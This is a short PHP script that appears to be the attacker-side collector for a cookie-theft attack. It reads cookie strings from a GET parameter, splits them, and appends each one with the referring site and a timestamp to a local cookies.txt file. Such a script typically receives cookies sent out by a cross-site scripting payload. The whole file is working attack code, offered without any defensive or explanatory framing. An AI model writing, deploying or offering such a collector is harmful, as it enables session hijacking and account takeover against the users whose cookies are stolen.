<?php

#If the GET variable cookiess is set run this code
if(isset($_GET['c'])) {

   #Seperate each cookie into an array
   $cookies = explode(' ', $_GET['c']);

   #Open file in append mode
   $fp = fopen('cookies.txt', 'a');

   #Write cookies to file
   foreach($cookies as $cookie) {
      fwrite($fp, 'Referer: "'.$_SERVER['HTTP_REFERER'].'" ('.date('H:i:s j-n-Y').'): '.$cookie. "\r\n");
   }

   #Close file pointer and clear variables
   fclose($fp);
   unset($cookies);
}

?>
